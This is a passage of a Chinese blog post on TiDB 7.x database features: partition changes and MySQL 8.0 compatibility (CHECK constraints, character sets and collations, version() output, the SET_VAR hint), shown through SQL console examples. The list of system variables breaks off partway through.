<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t_age\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">Table</span>: t_age</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_age` (</span><br><span class="line">  `a` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_bin</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 转为分区表</span></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t_age <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">RANGE</span> (a) </span><br><span class="line">   <span class="operator">-</span><span class="operator">&gt;</span> ( <span class="keyword">PARTITION</span> p0 <span class="keyword">VALUES</span> LESS THAN (<span class="number">18</span>)</span><br><span class="line">   <span class="operator">-</span><span class="operator">&gt;</span> , <span class="keyword">PARTITION</span> p1 <span class="keyword">VALUES</span> LESS THAN (<span class="number">35</span>)</span><br><span class="line">   <span class="operator">-</span><span class="operator">&gt;</span> , <span class="keyword">PARTITION</span> p2 <span class="keyword">VALUES</span> LESS THAN (MAXVALUE));</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.11</span> sec)</span><br><span class="line"></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t_age\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">Table</span>: t_age</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_age` (</span><br><span class="line">  `a` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_bin</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">RANGE</span> (`a`)</span><br><span class="line">(<span class="keyword">PARTITION</span> `p0` <span class="keyword">VALUES</span> LESS THAN (<span class="number">18</span>),</span><br><span class="line"><span class="keyword">PARTITION</span> `p1` <span class="keyword">VALUES</span> LESS THAN (<span class="number">35</span>),</span><br><span class="line"><span class="keyword">PARTITION</span> `p2` <span class="keyword">VALUES</span> LESS THAN (MAXVALUE))</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 分区定义从 RANGE 变更为 LIST</span></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t_age <span class="keyword">PARTITION</span> <span class="keyword">BY</span> LIST (a)</span><br><span class="line">   <span class="operator">-</span><span class="operator">&gt;</span> ( <span class="keyword">PARTITION</span> p0 <span class="keyword">VALUES</span> <span class="keyword">IN</span> (<span class="number">18</span>)</span><br><span class="line">   <span class="operator">-</span><span class="operator">&gt;</span> , <span class="keyword">PARTITION</span> p1 <span class="keyword">VALUES</span> <span class="keyword">IN</span> (<span class="number">35</span>)</span><br><span class="line">   <span class="operator">-</span><span class="operator">&gt;</span> , <span class="keyword">PARTITION</span> p2 <span class="keyword">VALUES</span> <span class="keyword">IN</span> (<span class="number">65</span>));</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.12</span> sec)</span><br><span class="line"></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t_age\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">Table</span>: t_age</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_age` (</span><br><span class="line">  `a` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_bin</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> LIST (`a`)</span><br><span class="line">(<span class="keyword">PARTITION</span> `p0` <span class="keyword">VALUES</span> <span class="keyword">IN</span> (<span class="number">18</span>),</span><br><span class="line"><span class="keyword">PARTITION</span> `p1` <span class="keyword">VALUES</span> <span class="keyword">IN</span> (<span class="number">35</span>),</span><br><span class="line"><span class="keyword">PARTITION</span> `p2` <span class="keyword">VALUES</span> <span class="keyword">IN</span> (<span class="number">65</span>))</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 移除分区</span></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> t_age remove partitioning;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.10</span> sec)</span><br><span class="line"></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t_age\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">Table</span>: t_age</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_age` (</span><br><span class="line">  `a` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_bin</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>!!! Tips 提示：</p>
<p>在分区表定义更新后，建议手动更新统计信息（有些环境可能已经关闭自动更新<sup class="footnote-ref"><a href="#fn16" id="fnref16">[16]</a></sup>）。</p>
<h3 id="M️-font-color-0080FF-2-3-MySQL-8-0-兼容性-font">Ⓜ️ <font color='#0080FF'>2.3 MySQL 8.0 兼容性</font></h3>
<p>在 PingCAP 公众号最近发布的通告中，<a class="link"   href="https://tidb.net/blog/ebd9dba5" >TiDB 7.4 发版：正式兼容 MySQL 8.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，详细地介绍了 TiDB 7.4 DMR 在 MySQL 8.0 兼容性方面取得的最新进展。<br>
通告中已经列举了若干新特性，本文将做进一步补充。同时，在 TiDB 7.4 DMR 的发版说明中有些小改动并未列出，下面也将进行列举说明，以供参考。</p>
<h4 id="1️⃣-TiDB-7-2-0，新增支持-CHECK-约束">1️⃣ TiDB 7.2.0，新增支持 <code>CHECK</code> 约束</h4>
<p>从 MySQL 8.0.16 开始，MySQL 实现了 CHECK 约束核心特性，并增加了新的信息表 <code>INFORMATION_SCHEMA.CHECK_CONSTRAINTS</code> 用来展示 CHECK 约束定义。<sup class="footnote-ref"><a href="#fn17" id="fnref17">[17]</a></sup></p>
<p>从 TiDB 7.2.0 开始，TiDB 新增支持 <code>CHECK</code> 约束，并在 7.4 中增加表 <code>I_S.CHECK_CONSTRAINTS</code>。需要注意的是，该功能默认关闭，需要通过变量 <code>tidb_enable_check_constraint</code> 进行控制。相关 SQL 控制命令如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 启用 CHECK 约束功能</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> tidb_enable_check_constraint<span class="operator">=</span><span class="keyword">ON</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> <span class="keyword">CHECK</span> (<span class="number">1</span> <span class="operator">&lt;</span> a);</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> <span class="keyword">CHECK</span> (<span class="number">1</span> <span class="operator">&lt;</span> a) <span class="keyword">NOT</span> ENFORCED;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t <span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> t_chk_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 启用约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t <span class="keyword">ALTER</span> <span class="keyword">CONSTRAINT</span> t_chk_1 ENFORCED;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 禁用约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t <span class="keyword">ALTER</span> <span class="keyword">CONSTRAINT</span> t_chk_1 <span class="keyword">NOT</span> ENFORCED;</span><br></pre></td></tr></table></figure></div>
<p>Ps. 在测试该特性时遇到了两个问题，分别提了 Issue，期待在 TiDB 7.5.0 LTS 代码冻结之前修复。</p>
<ul>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/47567" >[Merged] CHECK CONSTRAINT loss when ENFORCED again #47567 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/47565" >[Open] Support TABLE_NAME in CHECK_CONSTRAINTS #47565 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/docs-cn/issues/15376" >[Closed] doc: I_S.CHECK_CONSTRAINTS #15376 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h4 id="2️⃣-TiDB-7-2-0，支持指定-utf8mb3-字符集；TiDB-7-4-0，支持指定-utf8mb4-0900-ai-ci-utf8mb4-0900-bin-排序规则">2️⃣ TiDB 7.2.0，支持指定 <code>utf8mb3</code> 字符集；TiDB 7.4.0，支持指定 <code>utf8mb4_0900_ai_ci</code>/<code>utf8mb4_0900_bin</code> 排序规则</h4>
<p>在之前的文章中，<a href="https://shawnyan.cn/2022/tidb/tidb-6.0-new-collation/">TiDB 6.x 新特性解读 | Collation 规则</a> ，介绍过 TiDB 的字符集和排序规则，经过若干版本的迭代，TiDB 在全面兼容 MySQL 8.0 的征途上又更进一步。</p>
<p>从 TiDB 7.2.0 开始，支持 utf8mb3 字符集，其作为 utf8 的别名。示例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> t_utf8 (a <span class="type">int</span>) charset<span class="operator">=</span>utf8;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.02</span> sec)</span><br><span class="line"></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> t_utf8mb3 (a <span class="type">int</span>) charset<span class="operator">=</span>utf8mb3;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.04</span> sec)</span><br><span class="line"></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t_utf8\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">Table</span>: t_utf8</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_utf8` (</span><br><span class="line">  `a` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8_bin</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t_utf8mb3\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">Table</span>: t_utf8mb3</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_utf8mb3` (</span><br><span class="line">  `a` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8_bin</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>从 TiDB 7.4.0 开始，支持指定 utf8mb4_0900_ai_ci/utf8mb4_0900_bin 排序规则，在 7.4.0 的发版说明中有这样一段描述<sup class="footnote-ref"><a href="#fn18" id="fnref18">[18]</a></sup>：</p>
<blockquote>
<p>TiDB v7.4.0 增强了从 MySQL 8.0 迁移数据的支持。新增两个排序规则 (Collation) <code>utf8mb4_0900_ai_ci</code> 和 <code>utf8mb4_0900_bin</code>。其中 <code>utf8mb4_0900_ai_ci</code> 为 MySQL 8.0 的默认排序规则。<br>
同时新增支持 MySQL 8.0 兼容的系统变量 <code>default_collation_for_utf8mb4</code>，允许用户为 utf8mb4 字符集指定默认的排序方式，以兼容从 MySQL 5.7 或之前版本迁移或数据复制的场景。</p>
</blockquote>
<p>这里需要注意的是，在 TiDB 中，utf8mb4 字符集的默认排序规则仍然是 <code>utf8mb4_bin</code>。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">select</span> @<span class="variable">@default_collation_for_utf8mb4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> @<span class="variable">@default_collation_for_utf8mb4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> utf8mb4_bin                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>做个对照实验，更加直观地展示区别：</p>
<img  alt="t02-collate.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/t02-collate-1697647545188.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="3️⃣-TiDB-7-4-0，version-返回信息变更">3️⃣ TiDB 7.4.0，<code>version()</code> 返回信息变更</h4>
<blockquote>
<p>自 v7.4.0 起，TiDB 已经兼容 MySQL 8.0 的核心功能，<code>version()</code> 将返回以 <code>8.0.11</code> 为前缀的版本信息。<sup class="footnote-ref"><a href="#fn19" id="fnref19">[19]</a></sup><sup class="footnote-ref"><a href="#fn20" id="fnref20">[20]</a></sup></p>
</blockquote>
<p>补充：MySQL 8.0.11 是 MySQL 8.0 系列的第一个 GA 版本。</p>
<p>示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">select</span> version();</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> version()                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.0</span><span class="number">.11</span><span class="operator">-</span>TiDB<span class="operator">-</span>v7<span class="number">.5</span><span class="number">.0</span><span class="operator">-</span>alpha <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>当然，如果为了合理规划漏扫，也可以自定义将 <code>8.0.11</code> 改为更新的版本，比如 <code>8.0.35</code>，修改方法参照 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/high-reliability-faq#%E6%88%91%E4%BB%AC%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%AF%B9-mysql-version-%E6%9C%89%E8%A6%81%E6%B1%82tidb-%E6%98%AF%E5%90%A6%E6%94%AF%E6%8C%81%E4%BF%AE%E6%94%B9-server-%E7%89%88%E6%9C%AC%E5%8F%B7%E5%91%A2" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>关于 TiDB 兼容 MySQL 8.0 的更多讨论，欢迎访问 AskTUG 论坛：<br>
<a class="link"   href="https://asktug.com/t/topic/1013682" >【唠嗑茶话会 88】关于 TiDB 兼容 MySQL 8.0 ，你最想支持的特性/功能是什么？ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="4️⃣-TiDB-7-4-0，新增支持使用-Hint-SER-VAR-修改系统变量">4️⃣ TiDB 7.4.0，新增支持使用 Hint <code>SER_VAR()</code> 修改系统变量</h4>
<blockquote>
<p>TiDB v7.4.0 新增支持与 MySQL 8.0 相似的优化器提示 <code>SET_VAR()</code>。通过在 SQL 语句中添加 Hint <code>SET_VAR()</code>，可以在语句运行过程中临时修改部分系统变量，以针对不同语句设置环境。<sup class="footnote-ref"><a href="#fn21" id="fnref21">[21]</a></sup></p>
</blockquote>
<p>举个栗子，在之前的版本中，如果想控制当前 Session 只从 TiFlash 读取数据，需要用到下面的语句：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> session tidb_isolation_read_engines <span class="operator">=</span> &quot;tiflash&quot;;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> t;</span><br></pre></td></tr></table></figure></div>
<p>或者：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="comment">/*+ read_from_storage(tiflash[t]) */</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> t;</span><br></pre></td></tr></table></figure></div>
<p>而从 TiDB 7.4.0 开始，可以使用 <code>SET_VAR()</code> 语法进行控制，更加灵活、便利：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="comment">/*+ set_var(tidb_isolation_read_engines=tiflash) */</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> t;</span><br></pre></td></tr></table></figure></div>
<p>从 TiDB 7.4 开始，官方文档的系统变量部分增加一个说明项“是否受 Hint <code>SET_VAR</code> 控制”<sup class="footnote-ref"><a href="#fn22" id="fnref22">[22]</a></sup>，当前版本中，受该 Hint <code>SET_VAR</code> 控制的系统变量共有 91 个：</p>
<ul>
<li><code>cte_max_recursion_depth</code></li>
<li><code>max_execution_time</code></li>
<li><code>mpp_exchange_compression_mode</code></li>
<li><code>mpp_version</code></li>
<li><code>sql_mode</code></li>
<li><code>tidb_allow_batch_cop</code></li>
<li><code>tidb_allow_fallback_to_tikv</code></li>
<li><code>tidb_allow_mpp</code></li>
<li><code>tidb_broadcast_join_threshold_count</code></li>
<li><code>tidb_broadcast_join_threshold_size</code></li>
<li><code>tidb_cost_model_version</code></li>
<li><code>tidb_default_string_match_selectivity</code></li>
<li><code>tidb_distsql_scan_concurrency</code></li>
<li><code>tidb_enable_cascades_planner</code></li>
<li><code>tidb_enable_extended_stats</code></li>
<li><code>tidb_enable_index_merge</code></li>
<li><code>tidb_enable_index_merge_join</code></li>
<li><code>tidb_enable_inl_join_inner_multi_pattern</code></li>
<li><code>tidb_enable_new_only_full_group_by_check</code></li>
<li><code>tidb_enable_non_prepared_plan_cache</code></li>
<li><code>tidb_enable_null_aware_anti_join</code></li>
<li><code>tidb_enable_ordered_result_mode</code></li>
<li><code>tidb_enable_outer_join_reorder</code></li>
<li><code>tidb_enable_paging</code></li>
<li><code>tidb_enable_prepared_plan_cache</code></li>
<li><code>tidb_enable_pseudo_for_outdated_stats</code></li>
<li><code>tidb_enable_vectorized_expression</code></li>
<li><code>tidb_enforce_mpp</code></li>
<li><code>tidb_executor_concurrency</code></li>
<li><code>tidb_index_join_batch_size</code></li>
<li><code>tidb_index_join_double_read_penalty_cost_rate</code></li>
<li><code>tidb_index_lookup_size</code></li>
<li><code>tidb_index_merge_intersection_concurrency</code></li>
<li><code>tidb_index_serial_scan_concurrency</code></li>
<li><code>tidb_isolation_read_engines</code></li>
<li><code>tidb_max_bytes_before_tiflash_external_group_by</code></li>
<li><code>tidb_max_bytes_before_tiflash_external_join</code></li>
<li><code>tidb_max_bytes_before_tiflash_external_sort</code></li>
<li><code>tidb_max_paging_size</code></li>
<li><code>tidb_merge_join_concurrency</code></li>
<li><code>tidb_min_paging_size</code></li>
<li><code>tidb_opt_advanced_join_hint</code></li>
<li><code>tidb_opt_agg_push_down</code></li>
<li><code>tidb_opt_broadcast_cartesian_join</code></li>
<li><code>tidb_opt_concurrency_factor</code></li>
<li><code>tidb_opt_copcpu_factor</code></li>
<li><code>tidb_opt_correlation_exp_factor</code></li>
<li><code>tidb_opt_correlation_threshold</code></li>
<li><code>tidb_opt_cpu_factor</code></li>
<li><code>tidb_opt_derive_topn</code></li>
<li><code>tidb_opt_desc_factor</code></li>
